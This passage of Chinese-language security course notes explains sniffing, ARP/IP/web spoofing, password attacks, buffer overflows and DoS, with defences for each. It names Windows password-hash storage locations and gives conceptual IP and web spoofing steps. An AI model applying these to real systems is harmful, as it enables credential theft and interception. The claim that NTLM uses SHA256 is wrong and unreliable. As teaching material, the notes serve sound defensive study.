<p><strong>常见嗅探工具</strong></p>
<p>•tcpdump嗅探器软件</p>
<p> 可以将网络中传送的数据包的包头完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助去掉无用的信息。同时也是维护的比较好的开源嗅探器软件，官方网址是<a href="http://www.tcpdump.org/%E3%80%82">http://www.tcpdump.org/。</a></p>
<p>•wireshark网络数据包分析工具</p>
<p>主要作用是捕获网络数据包，并尽可能详细地显示数据包的内容，它使用WinPCAP作为接口，直接与网卡进行数据报文交换， wireshark的官方网址是<a href="https://www.wireshark.org/%E3%80%82">https://www.wireshark.org/。</a></p>
<p><strong>集线器网络</strong></p>
<p><img src="https://s2.loli.net/2024/11/10/b12ujcUeyCz3WAi.png" alt="8.png"></p>
<p>假设机器A上的管理员为了维护机器C，使用了一个FTP命令向机器C进行远程登陆，</p>
<p>机器B上的管理员想知道究竟登陆机器C上FTP口令，仅仅需要把自己机器上的网卡置于混杂模式，并对接收到的数据帧进行分析。</p>
<p><strong>交换机网络</strong></p>
<p>几种在交换网络中实现的嗅探方法：</p>
<p>•MAC洪泛</p>
<p> 向交换机发送大量含有虚构的MAC地址和IP地址的包，使交换机无法处理如此多的信息，致使交换机进入了所谓的“打开失效”模式，也就是开始了类似于集线器的工作方式，向网络上所有机器广播数据包</p>
<p>•MAC欺骗</p>
<p> 攻击者通过将源MAC地址伪造为目标主机的源MAC地址，并将这样的数据包通过交换机发送出去，使得交换机不断的更新MAC—端口映射表，从而让交换机相信攻击者主机的MAC就是目标主机的MAC，交换机就会把本应发送给目标主机的数据包发送给攻击者</p>
<p>•ARP欺骗</p>
<p> 攻击者通过对网关和目标主机进行ARP欺骗，就可以截获两者之间的通信数据，实现嗅探的目的</p>
<h4 id="6-2-3-其他信息收集技术"><a href="#6-2-3-其他信息收集技术" class="headerlink" title="6.2.3 其他信息收集技术"></a>6.2.3 其他信息收集技术</h4><p><strong>利用公开服务收集信息</strong></p>
<pre><code> WEB与搜索引擎服务、USENET（新闻组服务）、WhoIs服务
</code></pre>
<p><strong>网络拓扑探测</strong></p>
<p>​	主要方法是路由跟踪，执行路由跟踪的工具是在类UNIX操作系统平台上的traceroute和Windows平台的Tracert客户端程序</p>
<p><strong>系统类型探测</strong></p>
<ul>
<li>利用端口扫描。</li>
<li>利用Banner</li>
<li>TCP&#x2F;IP协议栈指纹</li>
</ul>
<p>​	TCP&#x2F;IP 堆栈指纹识别是对 TCP&#x2F;IP 堆栈实现的特征的远程检测。然后，参数的组合可用于推断远程机器的操作系统（也称为操作系统指纹），或合并到设备指纹中</p>
<h4 id="6-2-4-关于漏洞与信息收集的防范"><a href="#6-2-4-关于漏洞与信息收集的防范" class="headerlink" title="6.2.4 关于漏洞与信息收集的防范"></a>6.2.4 关于漏洞与信息收集的防范</h4><p><strong>防范网络扫描：</strong></p>
<p>•在防火墙及过滤设备上采用严格的过滤规则，禁止扫描的数据包进入系统。</p>
<p>•主机系统除了必要的网络服务外，禁止其它的网络应用程序。 </p>
<p>•对于只对内开放的网络服务，更改其提供服务的端口。 </p>
<p>•抓取扫描时的数据包，对扫描者进行反向追踪。</p>
<p><strong>防范嗅探</strong>：</p>
<p>•及时打补丁。 </p>
<p>•开启本机监控。</p>
<p>•监控本地局域网的数据帧。</p>
<p>•对敏感数据加密。</p>
<p>•使用安全的拓扑结构。</p>
<p>•安装ARP防火墙。</p>
<h3 id="6-3-网络欺骗"><a href="#6-3-网络欺骗" class="headerlink" title="6.3 网络欺骗"></a>6.3 网络欺骗</h3><h4 id="6-3-1-IP欺骗"><a href="#6-3-1-IP欺骗" class="headerlink" title="6.3.1 IP欺骗"></a>6.3.1 IP欺骗</h4><p><strong>以其它主机IP作为源IP向目标主机发送数据包</strong></p>
<p><strong>IP欺骗的危害：</strong></p>
<p>以可信任的身份与服务器建立连接和伪造源IP地址，隐藏攻击者身份，消除攻击痕迹</p>
<p><strong>IP 欺骗的两种表现形式：</strong></p>
<p>•攻击者伪造的IP地址不可达或者根本不存在。</p>
<p>•攻击者通过在自己发出的IP 包中填入被目标主机所信任的主机的IP来进行冒充。</p>
<p><strong>IP欺骗的步骤</strong></p>
<p>•找到一个被目标主机信任的主机；</p>
<p>•使被信任的主机丧失工作能力；</p>
<p>•伪装成被信任的主机, 向目标主机发送SYN；</p>
<p>•猜测或嗅探得到SYN+ACK的值；</p>
<p>•再向目标主机发送ACK连接建立</p>
<h4 id="6-3-2-电子邮件欺骗"><a href="#6-3-2-电子邮件欺骗" class="headerlink" title="6.3.2 电子邮件欺骗"></a>6.3.2 电子邮件欺骗</h4><p>•电子邮件欺骗（email spoofing）是伪造电子邮件头，导致信息看起来来源于某个人或某个地方，而实际却不是真实的源地址。</p>
<p>•这种欺骗发生的主要原因是由于发送电子邮件最主要的协议—简单邮件传输协议（SMTP）不包括认证机制。即使SMTP服务扩展允许SMTP客户端通过邮件服务器来商议安全级别。但这一预防措施并不是总被使用。如果预防措施没有被使用，具备必要知识的任何人都可以连接到服务器，并使用其发送邮件</p>
<h4 id="6-3-3-Web欺骗"><a href="#6-3-3-Web欺骗" class="headerlink" title="6.3.3 Web欺骗"></a>6.3.3 Web欺骗</h4><p>•攻击者创造了一个表面上看起来完全相同的网站，它拥有相同的网页和链接。然而，攻击者控制着假冒的Web站点，这样被攻击者浏览器和Web服务器之间的所有网络信息完全被攻击者所截获</p>
<p>•基本原理：在受攻击者和提供真正服务的Web服务器之间设立攻击者的Web服务器，这种攻击种类在安全问题中称为“来自中间的攻击”</p>
<p><strong>工作流程如下所示</strong>：</p>
<ul>
<li><p>用户点击经过改写后的 <a href="http://www.www.org/http://home.xxx1.com">http://www.www.org/http://home.xxx1.com</a> ；</p>
</li>
<li><p><a href="http://www.www.org向http//home.xxx1.com">http://www.www.org向http://home.xxx1.com</a> 请求文档；</p>
</li>
<li><p><a href="http://home.xxx1.com向http//www.www.org">http://home.xxx1.com向http://www.www.org</a> 返回文档；</p>
</li>
<li><p><a href="http://www.www.org/">http://www.www.org</a> 改写文档中的所有URL；</p>
</li>
<li><p><a href="http://www.www.org/">http://www.www.org</a> 向用户返回改写后的文档。</p>
</li>
<li><p>•修改过的文档中的所有URL都指向了<a href="http://www.org/">www.org</a> ，当用户点击任何一个链接都会直接进入 <a href="http://www.org/">www.org</a> ，而不会直接进入真正的URL</p>
</li>
<li><p>•开始攻击之前，攻击者必须以某种方式引诱受攻击者进入攻击者所创造的错误的Web。黑客往往使用下面三种方法：</p>
</li>
<li><p>•把错误的Web链接放到一个热门Web站点上； </p>
</li>
<li><p>•如果受攻击者使用基于电子邮件，那么可以将它指向错误的Web； </p>
</li>
<li><p>•创建错误的Web索引，指示给搜索引擎</p>
</li>
<li><p>•构建自己的DNS服务器，IP地址解析到攻击WEB页面，且将攻击WEB页面伪造成被假冒的页面。</p>
</li>
</ul>
<h4 id="6-3-4-ARP欺骗"><a href="#6-3-4-ARP欺骗" class="headerlink" title="6.3.4 ARP欺骗"></a>6.3.4 ARP欺骗</h4><p>（前文嗅探处有提）</p>
<p><strong>•ARP原理：</strong></p>
<p> 主机A要向主机B发送报文，会查询本地的ARP缓存表，找到B的IP地址对应的MAC地址后，就会通过交换机进行数据传输。如果未找到，则广播A一个ARP请求报文（携带主机A的IP地址Ia——物理地址Pa），请求IP地址为Ib的主机B回答物理地址Pb。局域网内所有主机包括B都收到ARP请求，但只有主机B识别自己的IP地址，于是向A主机发回一个ARP响应报文。其中就包含有B的MAC地址，A接收到B的应答后，就会更新本地的ARP缓存。接着使用这个MAC地址发送数据。因此，本地高速缓存的这个ARP cache表是本地网络通讯的基础，这个缓存表是动态更新的。</p>
<p><strong>典型的ARP欺骗分为两种：</strong></p>
<ul>
<li>对路由器ARP cache表的欺骗</li>
<li>对内网PC的网关欺骗。</li>
</ul>
<p>第一种ARP欺骗的原理是截获网关数据。它通知路由器一系列错误的内网MAC地址，并按照一定的频率不断进行，使真实的地址信息无法通过更新保存在路由器的ARP cache中，结果路由器的所有数据只能发送给错误的MAC地址，造成正常PC无法收到信息。</p>
<p>第二种ARP欺骗的原理是——伪造网关。它的原理是建立假网关，让被它欺骗的PC向假网关发数据，而不是通过正常的网关连接到Internet。从被骗PC角度看，就是上不了网了，“网络掉线了”</p>
<p><strong>ARP欺骗能够得以实现的主要原因有</strong>：</p>
<p>•ARP协议设计之初没有考虑安全问题，所以任何计算机都可以发送虚假的ARP数据包；</p>
<p>•ARP协议的无状态性，响应数据包和请求数据包之间没有什么关系，如果主机收到一个ARP响应却无法知道是否真的发送过对应的ARP请求；</p>
<p>•ARP缓存需要定时更新，给攻击者以可乘之机。</p>
<p>•<strong>ARP欺骗的主要环境必须是局域网，也就是说攻击者必须先取得进入局域网的合法身份才能进行ARP欺骗</strong></p>
<p><strong>网络执法官原理</strong>：</p>
<p> 在网络执法官中，要想限制某台机器上网，只要点击”网卡”菜单中的”权限”，选择指定的网卡号或在用户列表中点击该网卡所在行，从右键菜单中选择”权限”。在弹出的对话框中即可限制该用户的权限。对于未登记网卡，可以这样限定其上线：只要设定好所有已知用户（登记）后，将网卡的默认权限改为禁止上线即可阻止所有未知的网卡上线。使用这两个功能就可限制用户上网。其原理是通过ARP欺骗发给被攻击的电脑一个假的网关IP地址对应的MAC，使其找不到网关真正的MAC地址，这样就可以禁止其上网。</p>
<p><img src="https://s2.loli.net/2024/11/10/9L6AxnsCBMRYpqi.png" alt="9.png"></p>
<p><img src="https://s2.loli.net/2024/11/10/TgrSXIcZU7eVohi.png" alt="10.png"></p>
<h4 id="6-3-5-非技术类欺骗"><a href="#6-3-5-非技术类欺骗" class="headerlink" title="6.3.5 非技术类欺骗"></a>6.3.5 非技术类欺骗</h4><ul>
<li>社会工程学</li>
<li>垃圾搜索</li>
</ul>
<p>​		•攻击者通过搜索被攻击者的废弃物，得到与攻击系统有关的信息</p>
<h4 id="6-3-6-关于网络欺骗的防范"><a href="#6-3-6-关于网络欺骗的防范" class="headerlink" title="6.3.6 关于网络欺骗的防范"></a>6.3.6 关于网络欺骗的防范</h4><h5 id="IP欺骗的防范"><a href="#IP欺骗的防范" class="headerlink" title="IP欺骗的防范"></a><strong>IP欺骗的防范</strong></h5><p>•抛弃基于地址的信任策略；</p>
<p>•进行包过滤，只信任内部主机；</p>
<p>•利用路由器屏蔽掉所有外部希望向内部发出的连接请求；</p>
<p>•使用加密传输和验证的方法；</p>
<p>•使用随机化的初始序列号，使得TCP序列号难以猜测。</p>
<h5 id="Web欺骗的防范"><a href="#Web欺骗的防范" class="headerlink" title="Web欺骗的防范"></a><strong>Web欺骗的防范</strong></h5><p><strong>短期的解决方案</strong>:</p>
<p>•禁止浏览器中的javascript功能，那么各类改写信息将原形毕露； </p>
<p>•确保浏览器的连接状态是可见的，它将给你提供当前位置的各类信息； </p>
<p>•时刻注意你所点击的URL链接会在位置状态行中得到正确的显示。 </p>
<p><strong>长期的解决方案</strong>:  </p>
<p>•改变浏览器，使之具有反映真实URL信息的功能，而不会被蒙蔽； </p>
<p>•对于通过安全连接建立的Web——浏览器对话，浏览器还应该告诉用户谁在另一端，而不只是表明一种安全连接的状态。</p>
<p><strong>ARP欺骗的防范</strong></p>
<p>•网关建立静态IP&#x2F;MAC对应关系,各主机建立MAC数据库</p>
<p>•建立DHCP服务器</p>
<p>•IDS（Intrusion Detection System，入侵检测系统）监听网络安全。</p>
<h3 id="6-4-口令攻击"><a href="#6-4-口令攻击" class="headerlink" title="6.4 口令攻击"></a>6.4 口令攻击</h3><h4 id="6-4-1-常见系统口令机制"><a href="#6-4-1-常见系统口令机制" class="headerlink" title="6.4.1 常见系统口令机制"></a>6.4.1 常见系统口令机制</h4><h5 id="口令的存储："><a href="#口令的存储：" class="headerlink" title="口令的存储："></a><strong>口令的存储</strong>：</h5><p>操作系统一般不存储明文口令，只保存口令散列。</p>
<p>可以在以下几个地方找到windows系统的口令散列：</p>
<p> 注册表，HKEY_LOCAL_MACHINE\SAM\SAM；</p>
<p> SAM文件，位置在%SystemRoot%system32\config\SAM；</p>
<p> 恢复盘，位置在%SystemRoot%repair</p>
<h5 id="口令的管理"><a href="#口令的管理" class="headerlink" title="口令的管理"></a>口令的管理</h5><p> Windows 系统使用安全账号管理器的机制来管理用户账号。<strong>安全账号管理器对账号的管理是通过安全标识进行的，安全标识在账号创建时就同时创建，一旦账号被删除，安全标识也同时被删除。</strong>安全标识是唯一的，即使是相同的用户名，在每次创建时获得的安全标识也完全不同。因此，一旦某个账号被删除，他的安全标识也就不存在了。即使重建相同的用户名账号，也会有不同的安全标识，不会保留原来的权限。</p>
<p><strong>Windows使用两种算法来处理明文口令，即LM算法和NTLM算法。</strong></p>
<p>•1) LM算法，口令转换为hash值，方法如下：</p>
<p> (1) 口令变成大写；</p>
<p> (2) 把口令变成14个字符，或截断或补齐；</p>
<p> (3) 这14个字符分成两个7字符；</p>
<p> (4) 用7个字符和DES算法加密一个64位“Magic ”；</p>
<p> (5) 把两个64位结果拼起来，得到128位值；</p>
<p> (6) 服务器保存该128位值</p>
<p>•2) NTLM算法，口令转换为hash值，方法如下：</p>
<p> (1) 把口令变成Unicode编码；</p>
<p> (2) 使用SHA256散列算法；</p>
<p> (3) 保存得到的128位散列值</p>
<h4 id="6-4-2-口令攻击技术"><a href="#6-4-2-口令攻击技术" class="headerlink" title="6.4.2 口令攻击技术"></a>6.4.2 口令攻击技术</h4><p><strong>根据攻击口令是否以网络连接的交互方式进行，可以将攻击分为在线口令攻击和离线口令攻击：</strong></p>
<ol>
<li>在线口令攻击：在线攻击是指在线状态下攻击者对用户口令进行的猜测试探攻击；</li>
<li>离线攻击：离线攻击是指攻击者通过某些手段进行任意多数量的口令猜测，采用攻击字典和攻击程序，最终获得口令。离线攻击方法是Internet上常用的攻击手段。</li>
</ol>
<p><strong>根据攻击手段是否参与实际的身份认证过程，可以将攻击分为主动口令攻击和被动口令攻击：</strong></p>
<ol>
<li>主动口令攻击又可以分为以下三种形式：</li>
</ol>
<ul>
<li>•字典攻击：字典攻击是一种把常见的、使用概率较高的口令集中存放在字典文件中，利用字典库中的数据不断的进行用户名和口令的反复测试。缺点是只能发现字典里存在的单词口令。</li>
<li>•强力攻击：尝试所有的字符组合方式，逐一去模拟口令验证过程，缺点是速度慢。</li>
<li>•组合攻击：综合了以上两种方法，这种攻击介于字典攻击和强力攻击之间。</li>
</ul>
<ol start="2">
<li>被动口令攻击又可以分为以下三种形式：</li>
</ol>
<ul>
<li>•网络数据流窃听：由于认证信息要通过网络传递，且很多认证系统的口令是未经加密的明文，攻击者通过窃听网络数据，就很容易分辨出某种特定系统的认证数据，并提取出用户名和口令。</li>
<li>•重放(Record&#x2F;Replay)：有的系统会将认证信息进行简单加密后进行传输，如果攻击者无法用第一种方式推算出口令，可以使用截取&#x2F;重放方式。攻击者仍可以采用离线方式对口令密文实施字典攻击；</li>
<li>•钓鱼攻击</li>
</ul>
<p><strong>口令技术的缺点</strong>：</p>
<p>•大多数系统的口令是明文传送到验证服务器的，容易被截获。某些系统在建立一个加密链路后再进行口令的传输以解决此问题，如配置链路加密机。 </p>
<p>•口令维护的成本较高。为保证安全性，口令应当经常更换。另外为避免对口令的字典攻击，口令应当保证一定的长度，并且尽量采用随机的字符。但缺点是难于记忆。</p>
<p>•口令容易在输入的时候被攻击者偷窥，而且用户无法及时发现。</p>
<h4 id="6-4-3-关于口令攻击的防范"><a href="#6-4-3-关于口令攻击的防范" class="headerlink" title="6.4.3 关于口令攻击的防范"></a>6.4.3 关于口令攻击的防范</h4><ol>
<li><strong>选择安全密码</strong></li>
</ol>
<ul>
<li>设置足够长度的口令</li>
<li>口令中混合使用大小写字母、数字、特殊符号</li>
</ul>
<ol start="2">
<li><strong>防止口令猜测攻击</strong></li>
</ol>
<ul>
<li>硬盘分区采用NTFS格式</li>
<li>正确设置和管理帐户</li>
<li>禁止不需要的服务</li>
<li>关闭不用的端口</li>
<li>禁止建立空连接</li>
</ul>
<ol start="3">
<li><strong>设置安全策略</strong></li>
</ol>
<ul>
<li>强制密码历史。确定唯一新密码的个数，在重新使用旧密码之前，用户必须使用这些密码。</li>
<li>密码最长使用期限。确定在要求用户更改密码之前用户可以使用该密码的天数。其值介于 0 和 999 之间；如果该值设置为 0，则密码从不过期。</li>
<li>密码最短使用期限。确定用户可以更改新密码之前这些新密码必须保留的天数。此设置被设计为与“强制密码历史”设置一起使用，这样用户就不能很快地重置有次数要求的密码并更改回旧密码。</li>
<li>密码长度最小值。确定密码最少可以有多少个字符。</li>
</ul>
<ol start="4">
<li><strong>采用加密的通信协议</strong>。</li>
</ol>
<p> 比如在使用web邮箱时，可以采用更加安全的https。</p>
<ol start="5">
<li><strong>使用U盾输入口令，降低键盘记录攻击的威胁。</strong></li>
</ol>
<p>  另外，访问网站时，注意区分是否是虚假站点。</p>
<h3 id="6-5-缓冲区溢出攻击"><a href="#6-5-缓冲区溢出攻击" class="headerlink" title="6.5 缓冲区溢出攻击"></a>6.5 缓冲区溢出攻击</h3><h4 id="6-5-1-缓冲区溢出的概念"><a href="#6-5-1-缓冲区溢出的概念" class="headerlink" title="6.5.1 缓冲区溢出的概念"></a>6.5.1 缓冲区溢出的概念</h4><p><strong>缓冲区</strong>：</p>
<p> 从程序的角度，缓冲区就是应用程序用来保存用户输入数据和代码的临时数据的内存空间。</p>
<p><strong>缓冲区溢出</strong>：</p>
<p> 如果用户输入的数据长度超出了程序为其分配的内存空间，这些数据就会覆盖程序为其它数据分配的内存空间，形成所谓的缓冲区溢出。</p>
<p><strong>缓冲区溢出的危害</strong>：</p>
<p> 缓冲区溢出是一种非常普遍、非常危险的漏洞，在各种操作系统和应用软件中广泛存在。利用缓冲区溢出攻击，可以导致程序运行失败、系统当机和重新启动等后果。更为严重的是，可以利用它执行非授权指令，甚至可以取得系统特权，进而进行各种非法操作。</p>
<h4 id="6-5-2-缓冲区溢出的基本原理"><a href="#6-5-2-缓冲区溢出的基本原理" class="headerlink" title="6.5.2 缓冲区溢出的基本原理"></a>6.5.2 缓冲区溢出的基本原理</h4><p>缓冲溢出通常在程序缓冲区编写超出其长度的代码——造成溢出，从而破坏其堆栈，使程序执行攻击者在程序地址空间中早已安排好的代码以达到其目的。</p>
<p>由于name只有8字节大小，在进行strcpy前，并没有检测argv[1]的长度，如果argv[1]的长度大于8，则复制时就会覆盖name数组后面的ebp的内容及main函数的返回地址。等函数返回时，程序就会跳转到修改后的地址去执行。</p>
<p><strong>几种实现缓冲区攻击的方法</strong></p>
<p> 在程序的地址空间里安排适当的代码</p>
<ul>
<li>•植入法。</li>
<li>•利用已经存在的代码。</li>
</ul>
<p> 通过适当的初始化寄存器和内存，让程序跳转到攻击者安排的地址空间执行</p>
<ul>
<li>•通过Activation Records（活动记录）改变地址</li>
<li>•通过Function Pointers（函数指针）改变地址</li>
<li>•通过Longjmpbuffers（长跳转缓冲区）改变地址</li>
</ul>
<h4 id="6-5-3-缓冲区溢出的类型"><a href="#6-5-3-缓冲区溢出的类型" class="headerlink" title="6.5.3 缓冲区溢出的类型"></a>6.5.3 缓冲区溢出的类型</h4><p><strong>按照溢出缓冲区所在的区域类型来划分，可分为栈溢出和堆溢出</strong></p>
<p>•栈溢出特点：缓冲区在栈中分配；拷贝的数据过长；覆盖了函数的返回地址、其它一些重要数据结构或函数指针</p>
<p>•堆溢出特点：缓冲区在堆中分配；拷贝的数据过长；覆盖了堆管理结构</p>
<p>•其他溢出类型中，最典型的就是整型溢出</p>
<p>•整型数溢出从造成溢出原因的角度来说可以分为三大类：存储溢出、计算溢出和符号问题</p>
<h4 id="6-5-4-缓冲区溢出的防范"><a href="#6-5-4-缓冲区溢出的防范" class="headerlink" title="6.5.4 缓冲区溢出的防范"></a>6.5.4 缓冲区溢出的防范</h4><p><strong>对缓冲区溢出的防范方法主要有以下几种方式</strong>：</p>
<p> 编写严格的代码</p>
<p> 不可执行堆栈数据段</p>
<p> 利用程序编译器的边界检查</p>
<p> 指针完整性检查</p>
<h3 id="6-6-拒绝服务攻击"><a href="#6-6-拒绝服务攻击" class="headerlink" title="6.6 拒绝服务攻击"></a>6.6 拒绝服务攻击</h3><h4 id="6-6-1-拒绝服务攻击的概念"><a href="#6-6-1-拒绝服务攻击的概念" class="headerlink" title="6.6.1 拒绝服务攻击的概念"></a>6.6.1 拒绝服务攻击的概念</h4><p><strong>服务：</strong></p>
<p> 是指系统提供的，用户需求的一些功能。</p>
<p><strong>拒绝服务</strong>（DoS）：</p>
<p> DoS是Denial of Service的简称，即拒绝服务，任何对服务的干涉，使得其可用性降低或者失去可用性均称为拒绝服务。例如一个计算机系统崩溃或其带宽耗尽或其硬盘被填满，导致其不能提供正常的服务，就构成拒绝服务。</p>
<p><strong>拒绝服务攻击</strong>：</p>
<p> 造成DoS的攻击行为被称为DoS攻击，其目的是使计算机或网络无法提供正常的服务。</p>
<p><strong>分布式拒绝服务（DDoS）攻击：</strong></p>
<p> 如果处于不同位置的多个攻击者同时向一个或数个目标发起攻击，或者一个或多个攻击者控制了位于不同位置的多台机器并利用这些机器对受害者同时实施攻击</p>
<h4 id="6-6-2-利用系统漏洞进行拒绝服务攻击"><a href="#6-6-2-利用系统漏洞进行拒绝服务攻击" class="headerlink" title="6.6.2 利用系统漏洞进行拒绝服务攻击"></a>6.6.2 利用系统漏洞进行拒绝服务攻击</h4><p>•系统漏洞是包含在操作系统或应用程序中与安全相关的系统缺陷。这些缺陷大多是由于错误的编程、粗心的源代码审核或一些不当的绑定所造成的，常被攻击者利用</p>
<p> 例如微软的Windows 操作系统中的安全漏洞允许rootkits在使用操作系统的计算机上隐藏起来或者实施拒绝服务器攻击</p>
<p> Windows GDI Plus library存在处理畸形图象漏洞，可能引起远程拒绝服务</p>
<p>•解决这类攻击方法只能是不停的修复漏洞，同时加强管理人员对这类问题的重视程度</p>
<h4 id="6-6-3-利用协议漏洞进行拒绝服务攻击"><a href="#6-6-3-利用协议漏洞进行拒绝服务攻击" class="headerlink" title="6.6.3 利用协议漏洞进行拒绝服务攻击"></a>6.6.3 利用协议漏洞进行拒绝服务攻击</h4><p>•几个典型的利用协议漏洞进行的拒绝服务攻击：</p>
<p> <strong>SYN Flood</strong></p>
<p> UDP flood拒绝服务攻击</p>
<p> <strong>Land攻击</strong></p>
<p>   这是利用漏洞，进行发送大量的源地址与目的地址相同的包，从而造成服务器解析Land包时占用大量的处理资源，当收到的包达到一定程度时，就会形成拒绝服务攻击。</p>
<p> <strong>死Ping</strong></p>
<p>   Ping是通过发送ICMP报文来判断主机是否存活。利用这个命令就能发动一次攻击，当发送超大型这种包时，也就是发送的包超过65535字节会造成服务器重组包时发生缓冲区溢出，从而让服务器崩溃发生拒绝服务。</p>
<h4 id="6-6-4-对拒绝服务攻击的防范"><a href="#6-6-4-对拒绝服务攻击的防范" class="headerlink" title="6.6.4 对拒绝服务攻击的防范"></a>6.6.4 对拒绝服务攻击的防范</h4><ul>
<li>•确保所有服务器采用最新系统，并打上安全补丁</li>
<li>•删除多余的网络服务</li>
<li>•自己定制防火墙规则</li>
<li>•确保从服务器相应的目录或文件数据库中删除未使用的服务</li>
<li>•禁止内部网通过Modem连接至PSTN系统</li>
<li>•禁止使用网络访问程序如Telnet、Ftp、Rsh、Rlogin和Rcp，以基于PKI的访问程序如SSH取代</li>
</ul>
<p>​			（ps: rsh是”remote shell”(远程 shell)的缩写，该命令在指定的远程主机上启动一个shell并执行用户在rsh命令行中指定的命令;如果用户没有给出要执行的命令，rsh就用rlogin命令使用户登录到远程机上。</p>
<p>​			remote file copy，即远程文件拷贝)</p>
<ul>
<li>•限制在防火墙外与网络文件共享</li>
<li>•在防火墙上运行端口映射程序或端口扫描程序</li>
<li>•检查所有网络设备和主机&#x2F;服务器系统的日志</li>
<li>•确保管理员对所有主机进行检查，而不仅针对关键主机</li>
</ul>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
</search>
